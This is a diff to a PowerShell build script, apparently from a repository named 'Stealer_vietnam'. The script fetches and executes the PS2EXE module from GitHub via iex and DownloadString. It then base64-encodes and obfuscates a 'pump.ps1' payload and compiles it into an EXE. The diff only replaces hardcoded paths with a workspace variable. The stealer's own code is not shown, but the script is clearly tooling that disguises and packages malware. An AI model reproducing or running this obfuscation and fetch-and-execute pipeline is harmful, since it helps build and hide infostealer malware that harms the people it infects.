@@ -19,14 +19,16 @@ function Base64-Obfuscator {
 	}
 }
 
+$folderpump = "$env:GITHUB_WORKSPACE\tootls\pump"
+
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
 
-$fileContent = Get-Content -Path "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.ps1" -Raw
+$fileContent = Get-Content -Path "$folderpump\pump.ps1" -Raw
 
 $base64Encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
 
 $code = Base64-Obfuscator -Data $base64Encoded
 
-Set-Content -Path "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.ps1" -Value $code
+Set-Content -Path "$folderpump\pump.ps1" -Value $code
 
-Invoke-ps2exe "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.ps1" "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.exe"
+Invoke-ps2exe "$folderpump\pump.ps1" "$folderpump\pump.exe"
